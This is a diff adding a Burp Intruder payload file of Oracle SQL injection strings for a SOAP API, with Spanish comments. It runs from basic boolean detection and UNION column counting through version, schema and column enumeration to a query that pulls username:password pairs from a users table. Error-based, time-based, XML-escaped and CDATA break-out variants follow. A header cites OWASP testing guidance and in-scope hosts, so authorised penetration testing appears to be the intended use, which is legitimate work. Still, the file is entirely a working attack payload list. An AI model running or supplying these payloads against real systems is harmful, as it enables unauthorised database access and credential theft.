@@ -1,0 +1,72 @@
+# ============================================================
+# SQLi ORACLE - Payloads para API SOAP (Burp Intruder)
+# Progresion: deteccion basica -> version BD -> esquemas -> datos
+# Uso: Intruder > Payloads > Load  (las lineas que empiezan con # se ignoran)
+# Marco: OWASP WSTG 4.2 (Inpudt Val) - solo hosts en scope.md
+# ============================================================
+
+# ---- [1] DETECCION Y BOOLEANAS ----
+'
+' OR '1'='1
+' OR '1'='2
+admin'--
+') OR ('1'='1
+
+# ---- [2] UNION: CONTEO DE COLUMNAS ----
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 6--
+' ORDER BY 7--
+' ORDER BY 8--
+' ORDER BY 10--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+
+# ---- [3] VERSION DE LA BD Y CONTEXTO ----
+' UNION SELECT NULL,(SELECT banner FROM v$version WHERE ROWNUM=1),NULL FROM dual--
+' UNION SELECT NULL,(SELECT banner FROM v$version),NULL FROM dual--
+' UNION SELECT NULL,(SELECT instance_name FROM v$instance),NULL FROM dual--
+' UNION SELECT NULL,SYS_CONTEXT('USERENV','CURRENT_SCHEMA')||':'||USER FROM dual--
+' UNION SELECT NULL,(SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual),NULL FROM dual--
+' UNION SELECT NULL,(SELECT version FROM v$instance),NULL FROM dual--
+
+# ---- [4] ESQUEMAS / TABLAS / COLUMNAS (FROM DUAL / ALL_*) ----
+' UNION SELECT NULL,owner FROM all_users--
+' UNION SELECT NULL,owner||'.'||table_name FROM all_tables WHERE ROWNUM<=10--
+' UNION SELECT NULL,owner||'.'||table_name FROM all_tables WHERE ROWNUM<=50--
+' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM<=10--
+' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USER' AND ROWNUM<=10--
+' UNION SELECT NULL,table_name||':'||column_name FROM all_tab_columns WHERE owner='SCOTT' AND ROWNUM<=10--
+' UNION SELECT NULL,(SELECT username||':'||password FROM users WHERE ROWNUM=1),NULL FROM dual--
+' UNION SELECT NULL,(SELECT object_name FROM user_objects WHERE ROWNUM<=5),NULL FROM dual--
+
+# ---- [5] ERROR-BASED (cuando UNION no refleja datos) ----
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT owner||'.'||table_name FROM all_tables WHERE ROWNUM=1))--
+' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--
+' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--
+' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--
+
+# ---- [6] TIME-BASED (ciego total - 1 sola peticion, revisar profile de ruido) ----
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--
+' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE '0' END FROM dual)='a--
+' OR DBMS_LOCK.SLEEP(5)='--
+' AND 1=(SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('v',5)='v')--
+
+# ---- [7] VARIANTES XML-ESCAPADAS (parametro dentro del body SOAP) ----
+&apos; OR &apos;1&apos;=&apos;1
+&apos; UNION SELECT NULL,(SELECT banner FROM v$version WHERE ROWNUM=1),NULL FROM dual--
+&apos; UNION SELECT NULL,owner||&apos;.&apos;||table_name FROM all_tables WHERE ROWNUM&lt;=10--
+&apos; UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name=&apos;USERS&apos; AND ROWNUM&lt;=10--
+&apos; AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
+
+# ---- [8] BREAK-OUT DE CDATA (si el body SOAP envuelve el valor en CDATA) ----
+]]&gt;&apos; OR &apos;1&apos;=&apos;1
+]]&gt;&apos; UNION SELECT NULL,(SELECT banner FROM v$version WHERE ROWNUM=1),NULL FROM dual--
